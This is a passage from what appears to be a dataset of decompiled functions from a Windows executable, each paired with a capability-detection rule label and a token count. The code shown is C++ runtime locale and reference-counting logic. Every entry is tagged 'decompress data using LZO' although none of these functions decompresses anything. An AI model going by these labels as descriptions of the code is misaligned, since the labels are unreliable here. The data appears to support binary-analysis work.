= iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = var_20h + -4;\n        iVar1 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (iVar1 < 1) {\n        fcn.00483750(puVar9);\n    }\n    if (*0x515a34 == 0) {\n        iVar1 = *(var_24h + -4);\n        *(var_24h + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = var_24h + -4;\n        iVar1 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (iVar1 < 1) {\n        fcn.00483750(puVar9);\n    }\n    fcn.0048b630(puVar9);\n    return;\n}\n",
        "token_count": 2292
    },
    "004ab010": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004ab010(uint arg_8h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    ushort uVar3;\n    int32_t *piVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    code *pcVar8;\n    int32_t in_ECX;\n    uint *puVar9;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uchar var_2ch;\n    uchar var_2bh [2];\n    uchar var_29h;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    piVar4 = fcn.004c0040(arg_8h);\n    if (*(*piVar4 + 8) == 0x44d3d0) {\n        *(in_ECX + 0x12) = *(piVar4[2] + 0x12);\n        pcVar8 = *(*piVar4 + 0xc);\n        if (pcVar8 != 0x44d440) goto code_r0x004ab3c8;\ncode_r0x004ab053:\n        *(in_ECX + 0x14) = *(piVar4[2] + 0x14);\n        pcVar8 = *(*piVar4 + 0x20);\n        if (pcVar8 != 0x44d3c0) goto code_r0x004ab3e0;\ncode_r0x004ab06e:\n        uVar7 = *(piVar4[2] + 0x30);\n    }\n    else {\n        uVar3 = (**(*piVar4 + 8))();\n        *(in_ECX + 0x12) = uVar3;\n        pcVar8 = *(*piVar4 + 0xc);\n        if (pcVar8 == 0x44d440) goto code_r0x004ab053;\ncode_r0x004ab3c8:\n        uVar3 = (*pcVar8)();\n        *(in_ECX + 0x14) = uVar3;\n        pcVar8 = *(*piVar4 + 0x20);\n        if (pcVar8 == 0x44d3c0) goto code_r0x004ab06e;\ncode_r0x004ab3e0:\n        uVar7 = (*pcVar8)();\n    }\n    *(in_ECX + 0x30) = uVar7;\n    if (*(*piVar4 + 0x10) == 0x44d220) {\n        fcn.0048ccb0(*(piVar4[2] + 8), &var_2ch);\n    }\n    else {\n        (**(*piVar4 + 0x10))(piVar4);\n    }\n    uVar7 = *(var_28h + -0xc);\n    *(in_ECX + 0xc) = uVar7;\n    puVar5 = fcn.004c2c50(uVar7);\n    fcn.0044bff0(puVar5, *(in_ECX + 0xc), 0);\n    bVar2 = false;\n    if (*(in_ECX + 0xc) != 0) {\n        var_40h = var_40h & 0xffffff00 | *puVar5;\n        bVar2 = *puVar5 - 1 < 0x7e;\n    }\n    *(in_ECX + 0x10) = bVar2;\n    if (*(*piVar4 + 0x14) == 0x44d390) {\n        fcn.00484f20(*(piVar4[2] + 0x18), var_2bh);\n        uVar6 = *(var_24h + -0xc);\n        *(in_ECX + 0x1c) = uVar6;\n        if (0x3ffffffe < uVar6) goto code_r0x004ab41e;\ncode_r0x004ab127:\n        var_48h = fcn.004c2c50(uVar6 * 2);\n        fcn.0044b110(var_48h, *(in_ECX + 0x1c), 0);\n        pcVar8 = *(*piVar4 + 0x18);\n        if (pcVar8 != 0x44d410) goto code_r0x004ab423;\n        fcn.00484f20();\n        uVar6 = *(var_20h + -0xc);\n        *(in_ECX + 0x24) = uVar6;\n        if (uVar6 < 0x3fffffff) goto code_r0x004ab193;\ncode_r0x004ab444:\n        puVar9 = &var_20h;\n        pcVar8 = fcn.004c33a0();\n    }\n    else {\n        (**(*piVar4 + 0x14))(piVar4);\n        uVar6 = *(var_24h + -0xc);\n        *(in_ECX + 0x1c) = uVar6;\n        if (uVar6 < 0x3fffffff) goto code_r0x004ab127;\ncode_r0x004ab41e:\n        pcVar8 = fcn.004c33a0();\ncode_r0x004ab423:\n        (*pcVar8)(piVar4);\n        uVar6 = *(var_20h + -0xc);\n        *(in_ECX + 0x24) = uVar6;\n        if (0x3ffffffe < uVar6) goto code_r0x004ab444;\ncode_r0x004ab193:\n        var_44h = fcn.004c2c50(uVar6 * 2);\n        fcn.0044b110(var_44h, *(in_ECX + 0x24), 0);\n        if (*(*piVar4 + 0x1c) == 0x44d3e0) {\n            fcn.00484f20(*(piVar4[2] + 0x28), &var_29h);\n            uVar6 = *(var_1ch + -0xc);\n            *(in_ECX + 0x2c) = uVar6;\n            if (0x3ffffffe < uVar6) goto code_r0x004ab487;\ncode_r0x004ab200:\n            var_40h = fcn.004c2c50(uVar6 * 2);\n            fcn.0044b110(var_40h, *(in_ECX + 0x2c), 0);\n            pcVar8 = *(*piVar4 + 0x24);\n            if (pcVar8 != 0x44d2a0) goto code_r0x004ab490;\n            uVar7 = *(piVar4[2] + 0x34);\n        }\n        else {\n            (**(*piVar4 + 0x1c))(piVar4);\n            uVar6 = *(var_1ch + -0xc);\n            *(in_ECX + 0x2c) = uVar6;\n            if (uVar6 < 0x3fffffff) goto code_r0x004ab200;\ncode_r0x004ab487:\n            pcVar8 = fcn.004c33a0();\ncode_r0x004ab490:\n            uVar7 = (*pcVar8)();\n        }\n        puVar9 = &var_29h;\n        *(in_ECX + 0x34) = uVar7;\n        pcVar8 = *(*piVar4 + 0x28);\n        if (pcVar8 == 0x44d290) {\n            uVar7 = *(piVar4[2] + 0x38);\n            goto code_r0x004ab25b;\n        }\n    }\n    uVar7 = (*pcVar8)();\ncode_r0x004ab25b:\n    *(in_ECX + 0x38) = uVar7;\n    piVar4 = fcn.004c01c0(arg_8h);\n    (**(*piVar4 + 0x2c))(*0x516da8, *0x516da8 + 0xb, in_ECX + 0x3c);\n    *(in_ECX + 0x52) = 1;\n    *(in_ECX + 8) = puVar5;\n    *(in_ECX + 0x18) = var_48h;\n    *(in_ECX + 0x20) = var_44h;\n    *(in_ECX + 0x28) = var_40h;\n    if (*0x515a34 == 0) {\n        iVar1 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = var_1ch + -4;\n        iVar1 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (iVar1 < 1) {\n        fcn.00483750(puVar9);\n    }\n    if (*0x515a34 == 0) {\n        iVar1 = *(var_20h + -4);\n        *(var_20h + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = var_20h + -4;\n        iVar1 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (iVar1 < 1) {\n        fcn.00483750(puVar9);\n    }\n    if (*0x515a34 == 0) {\n        iVar1 = *(var_24h + -4);\n        *(var_24h + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = var_24h + -4;\n        iVar1 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (iVar1 < 1) {\n        fcn.00483750(puVar9);\n    }\n    fcn.0048b630(puVar9);\n    return;\n}\n",
        "token_count": 2296
    },
    "004aba90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004aba90(int32_t param_1, char param_2, char *param_3, char *param_4, int32_t param_5, int32_t param_6)\n\n{\n    char cVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    char *pcVar6;\n    char *in_stack_ffffffcc;\n    int32_t iStack48;\n    \n    piVar5 = param_2;\n    param_5 = param_5 - param_6;\n    uVar3 = *(param_1 + 0xc) & 0xb0;\n    if (uVar3 == 0x20) {\n        if (param_6 != 0) {\n            sub.msvcrt.dll_memcpy(param_3, param_4, param_6);\n        }\n        if (param_5 == 0) {\n            return;\n        }\n    // WARNING: Could not recover jumptable at 0x00446e20. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_memset)();\n        return;\n    }\n    if (uVar3 == 0x10) {\n        piVar4 = fcn.004c0160(param_1 + 0x6c);\n        if (*(piVar4 + 7) == '\\0') {\n            fcn.004512b0();\n            cVar2 = '-';\n            if (*(*piVar4 + 0x18) != 0x451560) {\n                cVar2 = (**(*piVar4 + 0x18))(0x2d);\n            }\n            cVar1 = *param_4;\n            if (cVar1 != cVar2) {\n                if (*(piVar4 + 7) != '\\0') goto code_r0x004abbbf;\n                fcn.004512b0();\n                cVar2 = '+';\n                if (*(*piVar4 + 0x18) != 0x451560) {\n                    cVar2 = (**(*piVar4 + 0x18))(0x2b);\n                }\n                cVar1 = *param_4;\n                if (cVar1 != cVar2) {\n                    if (*(piVar4 + 7) != '\\0') goto code_r0x004abaf0;\n                    fcn.004512b0();\n                    cVar2 = '0';\n                    if (*(*piVar4 + 0x18) != 0x451560) {\n                        cVar2 = (**(*piVar4 + 0x18))(0x30);\n                    }\n                    if ((*param_4 != cVar2) || (param_6 < 2)) goto code_r0x004abad6;\n                    if (*(piVar4 + 7) != '\\0') goto code_r0x004abafa;\n                    cVar1 = fcn.004514e0(0x78);\n                    cVar2 = *(iStack48 + 1);\n                    if (cVar2 != cVar1) {\n                        if (*(piVar5 + 7) != '\\0') goto code_r0x004abb0e;\n                        cVar1 = fcn.004514e0(0x58);\n                        cVar2 = in_stack_ffffffcc[1];\n                        goto code_r0x004abb12;\n                    }\n                    goto code_r0x004abd3f;\n                }\n            }\ncode_r0x004abbc8:\n            *param_3 = cVar2;\n            param_6 = param_6 + -1;\n            param_3 = param_3 + 1;\n            goto code_r0x004abad6;\n        }\n        cVar1 = *param_4;\n        cVar2 = cVar1;\n        if (*(piVar4 + 0x4a) == cVar1) goto code_r0x004abbc8;\ncode_r0x004abbbf:\n        cVar2 = cVar1;\n        if (*(piVar4 + 0x12) == cVar1) goto code_r0x004abbc8;\ncode_r0x004abaf0:\n        if ((*(piVar4 + 0x4d) != cVar1) || (param_6 < 2)) goto code_r0x004abad6;\ncode_r0x004abafa:\n        cVar2 = param_4[1];\n        piVar5 = piVar4;\n        if (cVar2 == *(piVar4 + 0x95)) {\ncode_r0x004abd3f:\n            param_6 = param_6 + -2;\n            *param_3 = *in_stack_ffffffcc;\n            param_3[1] = in_stack_ffffffcc[1];\n            param_3 = param_3 + 2;\n            goto code_r0x004abad6;\n        }\ncode_r0x004abb0e:\n        cVar1 = *(piVar5 + 0x75);\ncode_r0x004abb12:\n        if (cVar1 == cVar2) goto code_r0x004abd3f;\n        pcVar6 = param_3 + param_5;\n        if (param_5 == 0) goto code_r0x00446e30;\ncode_r0x004abb21:\n        sub.msvcrt.dll_memset(param_3, iStack48, param_5);\n    }\n    else {\ncode_r0x004abad6:\n        pcVar6 = param_3 + param_5;\n        if (param_5 != 0) goto code_r0x004abb21;\n    }\n    if (param_6 == 0) {\n        return;\n    }\ncode_r0x00446e30:\n    // WARNING: Could not recover jumptable at 0x00446e30. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_memcpy)(pcVar6);\n    return;\n}\n",
        "token_count": 1312
    },
    "004abd90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.004abd90(int32_t param_1, int16_t param_2, int16_t *param_3, int16_t *param_4, int32_t param_5, int32_t param_6\n                 )\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint var_1h;\n    \n    param_5 = param_5 - param_6;\n    uVar2 = *(param_1 + 0xc) & 0xb0;\n    if (uVar2 == 0x20) {\n        if (param_6 != 0) {\n            sub.msvcrt.dll_memcpy(param_3, param_4, param_6 * 2);\n        }\n        if (param_5 != 0) {\n            param_3 = param_3 + param_6;\n            do {\n                *param_3 = param_2;\n                param_3 = param_3 + 1;\n                param_5 = param_5 + -1;\n            } while (param_5 != 0);\n            return;\n        }\n    }\n    else {\n        if (uVar2 == 0x10) {\n            piVar3 = fcn.004c01c0(param_1 + 0x6c);\n            iVar1 = (**(*piVar3 + 0x28))(0x2d);\n            if ((*param_4 == iVar1) || (iVar1 = (**(*piVar3 + 0x28))(0x2b),  *param_4 == iVar1)) {\n                *param_3 = iVar1;\n                param_6 = param_6 + -1;\n                param_3 = param_3 + 1;\n            }\n            else {\n                iVar1 = (**(*piVar3 + 0x28))(0x30);\n                if ((*param_4 == iVar1) && (1 < param_6)) {\n                    iVar1 = (**(*piVar3 + 0x28))(0x78);\n                    if ((param_4[1] != iVar1) && (iVar1 = (**(*piVar3 + 0x28))(0x58),  param_4[1] != iVar1)) {\n                        if (param_5 != 0) goto code_r0x004abdf0;\n                        goto code_r0x00446e30;\n                    }\n                    param_6 = param_6 + -2;\n                    *param_3 = *param_4;\n                    param_3[1] = param_4[1];\n                    param_3 = param_3 + 2;\n                }\n            }\n        }\n        for (; param_5 != 0; param_5 = param_5 + -1) {\ncode_r0x004abdf0:\n            *param_3 = param_2;\n            param_3 = param_3 + 1;\n        }\n        if (param_6 != 0) {\ncode_r0x00446e30:\n    // WARNING: Could not recover jumptable at 0x00446e30. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_memcpy)();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 722
    },
    "004ac170": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004ac170(int32_t param_1)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    do {\n        iVar2 = fcn.0043d840(iVar3);\n        if (iVar2 == -1) {\n            *(param_1 + 0xc) = 0;\n            goto code_r0x004ac1a0;\n        }\n        *(param_1 + 0xd + iVar3) = iVar2;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0x80);\n    *(param_1 + 0xc) = 1;\ncode_r0x004ac1a0:\n    iVar3 = 0;\n    do {\n        uVar1 = fcn.0043c880(iVar3);\n        *(param_1 + 0x8e + iVar3 * 2) = uVar1;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0x100);\n    iVar3 = 0;\n    do {\n        iVar2 = 1 << (iVar3 & 0x1f);\n        *(param_1 + 0x28e + iVar3 * 2) = iVar2;\n        uVar1 = fcn.00451730(iVar2);\n        *(param_1 + 0x2ae + iVar3 * 2) = uVar1;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0x10);\n    return;\n}\n",
        "token_count": 349
    },
    "004ac2f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004ac2f0(void)\n\n{\n    if (*0x515a34 == 0) {\n        if (*0x516f08 == 0) {\ncode_r0x004ac32d:\n            fcn.004ad8e0(2);\n            *0x516f08 = 0x515cd4;\n            *0x516f24 = 0x515cd4;\n            return;\n        }\n    }\n    else {\n        fcn.00438120(0x516f1c, 0x4ac360);\n        if (*0x516f08 == 0) goto code_r0x004ac32d;\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "004ac3d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004ac3d0(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t in_ECX;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    uVar1 = *arg_8h;\n    uVar2 = arg_8h[2];\n    *0x516de4 = 0x52cc1c;\n    uVar3 = arg_8h[1];\n    *0x516de8 = 1;\n    *0x516dec = uVar1;\n    fcn.004bb160(0);\n    if (*0x515a34 != 0) {\n        LOCK();\n    }\n    *0x516de8 = *0x516de8 + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00451af0();\n    *(iVar9 + iVar7 * 4) = 0x516de4;\n    *0x516e60 = 1;\n    *0x516e5c = 0x52cab0;\n    *0x516e64 = fcn.004ae940();\n    if (*0x515a34 != 0) {\n        LOCK();\n    }\n    *0x516e60 = *0x516e60 + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00451af0();\n    *(iVar9 + iVar7 * 4) = 0x516e5c;\n    *0x516e30 = 1;\n    *0x516e2c = 0x52bec8;\n    *0x516e34 = uVar3;\n    fcn.0048d7a0(0, 0);\n    if (*0x515a34 != 0) {\n        LOCK();\n    }\n    *0x516e30 = *0x516e30 + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00451af0();\n    *(iVar9 + iVar7 * 4) = 0x516e2c;\n    *0x516e3c = 1;\n    *0x516e38 = 0x52befc;\n    *0x516e40 = uVar2;\n    fcn.0048db80(0, 0);\n    if (*0x515a34 != 0) {\n        LOCK();\n    }\n    *0x516e3c = *0x516e3c + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00451af0();\n    *(iVar9 + iVar7 * 4) = 0x516e38;\n    *0x516e0c = 0x52cd24;\n    if (*0x515a34 != 0) {\n        LOCK();\n    }\n    *0x516e10 = 2;\n    iVar9 = *(in_ECX + 4);\n    iVar8 = fcn.00451af0();\n    iVar7 = *0x515a34;\n    *(iVar9 + iVar8 * 4) = 0x516e0c;\n    *0x516e1c = 0x52cd54;\n    if (iVar7 != 0) {\n        LOCK();\n    }\n    *0x516e20 = 2;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00451af0();\n    *(iVar9 + iVar7 * 4) = 0x516e1c;\n    *0x516dfc = 0x52cc64;\n    if (*0x515a34 != 0) {\n        LOCK();\n    }\n    *0x516e00 = 2;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00451af0();\n    *(iVar9 + iVar7 * 4) = 0x516dfc;\n    fcn.004bae80(1);\n    if (*0x515a34 != 0) {\n        LOCK();\n    }\n    *0x516dc8 = *0x516dc8 + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00451af0();\n    *(iVar9 + iVar7 * 4) = 0x516dc4;\n    uVar4 = arg_8h[3];\n    *0x516df4 = 1;\n    uVar5 = arg_8h[4];\n    uVar6 = arg_8h[5];\n    *0x516df0 = 0x52cc40;\n    *0x516df8 = uVar4;\n    fcn.004bb4b0(0);\n    if (*0x515a34 != 0) {\n        LOCK();\n    }\n    *0x516df4 = *0x516df4 + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00451af0();\n    *(iVar9 + iVar7 * 4) = 0x516df0;\n    *0x516e6c = 1;\n    *0x516e68 = 0x52cacc;\n    *0x516e70 = fcn.004ae940();\n    if (*0x515a34 != 0) {\n        LOCK();\n    }\n    *0x516e6c = *0x516e6c + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00451af0();\n    *(iVar9 + iVar7 * 4) = 0x516e68;\n    *0x516e48 = 1;\n    *0x516e44 = 0x52bf30;\n    *0x516e4c = uVar5;\n    fcn.0048df60(0, 0);\n    if (*0x515a34 != 0) {\n        LOCK();\n    }\n    *0x516e48 = *0x516e48 + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00451af0();\n    *(iVar9 + iVar7 * 4) = 0x516e44;\n    *0x516e54 = 1;\n    *0x516e50 = 0x52bf64;\n    *0x516e58 = uVar6;\n    fcn.0048e350(0, 0);\n    if (*0x515a34 != 0) {\n        LOCK();\n    }\n    *0x516e54 = *0x516e54 + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00451af0();\n    *(iVar9 + iVar7 * 4) = 0x516e50;\n    *0x516e14 = 0x52cd3c;\n    if (*0x515a34 != 0) {\n        LOCK();\n    }\n    *0x516e18 = 2;\n    iVar9 = *(in_ECX + 4);\n    iVar8 = fcn.00451af0();\n    iVar7 = *0x515a34;\n    *(iVar9 + iVar8 * 4) = 0x516e14;\n    *0x516e24 = 0x52cd6c;\n    if (iVar7 != 0) {\n        LOCK();\n    }\n    *0x516e28 = 2;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00451af0();\n    *(iVar9 + iVar7 * 4) = 0x516e24;\n    *0x516e04 = 0x52cc8c;\n    if (*0x515a34 != 0) {\n        LOCK();\n    }\n    *0x516e08 = 2;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00451af0();\n    *(iVar9 + iVar7 * 4) = 0x516e04;\n    fcn.004bb010(1);\n    if (*0x515a34 != 0) {\n        LOCK();\n    }\n    *0x516dd8 = *0x516dd8 + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00451af0();\n    *(iVar9 + iVar7 * 4) = 0x516dd4;\n    iVar9 = *(in_ECX + 0xc);\n    iVar7 = fcn.00451af0();\n    *(iVar9 + iVar7 * 4) = uVar1;\n    iVar9 = *(in_ECX + 0xc);\n    iVar7 = fcn.00451af0();\n    *(iVar9 + iVar7 * 4) = uVar3;\n    iVar9 = *(in_ECX + 0xc);\n    iVar7 = fcn.00451af0();\n    *(iVar9 + iVar7 * 4) = uVar2;\n    iVar9 = *(in_ECX + 0xc);\n    iVar7 = fcn.00451af0();\n    *(iVar9 + iVar7 * 4) = uVar4;\n    iVar9 = *(in_ECX + 0xc);\n    iVar8 = fcn.00451af0();\n    iVar7 = *(in_ECX + 0xc);\n    *(iVar9 + iVar8 * 4) = uVar5;\n    iVar9 = fcn.00451af0();\n    *(iVar7 + iVar9 * 4) = uVar6;\n    return;\n}\n",
        "token_count": 2218
    },
    "004acac0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004acac0(uint *arg_8h, uint *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    puVar1 = fcn.004c2c70(0xc);\n    uVar3 = *arg_8h;\n    puVar1[1] = 0;\n    *puVar1 = 0x52cc1c;\n    puVar1[2] = 0;\n    fcn.004bb160(uVar3);\n    if (*0x515a34 == 0) {\n        puVar1[1] = puVar1[1] + 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00451af0();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004c2c70(0xc);\n    var_1ch = *arg_8h;\n    puVar1[1] = 0;\n    *puVar1 = 0x52cab0;\n    uVar3 = fcn.004ae9b0(&var_1ch);\n    puVar1[2] = uVar3;\n    if (*0x515a34 == 0) {\n        puVar1[1] = puVar1[1] + 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00451af0();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004c2c70(0xc);\n    uVar3 = *arg_8h;\n    puVar1[1] = 0;\n    *puVar1 = 0x52bec8;\n    puVar1[2] = 0;\n    fcn.0048d7a0(uVar3, 0);\n    if (*0x515a34 == 0) {\n        puVar1[1] = puVar1[1] + 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00451af0();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004c2c70(0xc);\n    uVar3 = *arg_8h;\n    puVar1[1] = 0;\n    *puVar1 = 0x52befc;\n    puVar1[2] = 0;\n    fcn.0048db80(uVar3, 0);\n    if (*0x515a34 == 0) {\n        puVar1[1] = puVar1[1] + 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00451af0();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004c2c70(8);\n    puVar1[1] = 0;\n    *puVar1 = 0x52cd24;\n    if (*0x515a34 == 0) {\n        puVar1[1] = 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00451af0();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004c2c70(8);\n    iVar4 = *0x515a34;\n    puVar1[1] = 0;\n    *puVar1 = 0x52cd54;\n    if (iVar4 == 0) {\n        puVar1[1] = 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00451af0();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004c2c70(8);\n    iVar4 = *0x515a34;\n    puVar1[1] = 0;\n    *puVar1 = 0x52cc64;\n    if (iVar4 == 0) {\n        puVar1[1] = 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00451af0();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    iVar4 = fcn.004c2c70(0x10);\n    fcn.004bae40(*arg_8h, arg_10h, 0);\n    if (*0x515a34 == 0) {\n        *(iVar4 + 4) = *(iVar4 + 4) + 1;\n    }\n    else {\n        LOCK();\n        *(iVar4 + 4) = *(iVar4 + 4) + 1;\n    }\n    iVar2 = *(in_ECX + 4);\n    iVar5 = fcn.00451af0();\n    *(iVar2 + iVar5 * 4) = iVar4;\n    puVar1 = fcn.004c2c70(0xc);\n    uVar3 = *arg_8h;\n    puVar1[1] = 0;\n    *puVar1 = 0x52cc40;\n    puVar1[2] = 0;\n    fcn.004bb4b0(uVar3);\n    if (*0x515a34 == 0) {\n        puVar1[1] = puVar1[1] + 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00451af0();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004c2c70(0xc);\n    var_1ch = *arg_8h;\n    puVar1[1] = 0;\n    *puVar1 = 0x52cacc;\n    uVar3 = fcn.004ae9b0(&var_1ch);\n    puVar1[2] = uVar3;\n    if (*0x515a34 == 0) {\n        puVar1[1] = puVar1[1] + 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00451af0();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004c2c70(0xc);\n    puVar1[1] = 0;\n    uVar3 = *arg_ch;\n    *puVar1 = 0x52bf30;\n    puVar1[2] = 0;\n    fcn.0048df60(uVar3, arg_14h);\n    if (*0x515a34 == 0) {\n        puVar1[1] = puVar1[1] + 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00451af0();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004c2c70(0xc);\n    puVar1[1] = 0;\n    uVar3 = *arg_ch;\n    *puVar1 = 0x52bf64;\n    puVar1[2] = 0;\n    fcn.0048e350(uVar3, arg_14h);\n    if (*0x515a34 == 0) {\n        puVar1[1] = puVar1[1] + 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00451af0();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004c2c70(8);\n    puVar1[1] = 0;\n    *puVar1 = 0x52cd3c;\n    if (*0x515a34 == 0) {\n        puVar1[1] = 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00451af0();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004c2c70(8);\n    iVar4 = *0x515a34;\n    puVar1[1] = 0;\n    *puVar1 = 0x52cd6c;\n    if (iVar4 == 0) {\n        puVar1[1] = 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00451af0();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004c2c70(8);\n    iVar4 = *0x515a34;\n    puVar1[1] = 0;\n    *puVar1 = 0x52cc8c;\n    if (iVar4 == 0) {\n        puVar1[1] = 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00451af0();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    iVar4 = fcn.004c2c70(0x10);\n    fcn.004bafd0(*arg_8h, arg_10h, 0);\n    if (*0x515a34 == 0) {\n        *(iVar4 + 4) = *(iVar4 + 4) + 1;\n    }\n    else {\n        LOCK();\n        *(iVar4 + 4) = *(iVar4 + 4) + 1;\n    }\n    iVar2 = *(in_ECX + 4);\n    iVar5 = fcn.00451af0();\n    *(iVar2 + iVar5 * 4) = iVar4;\n    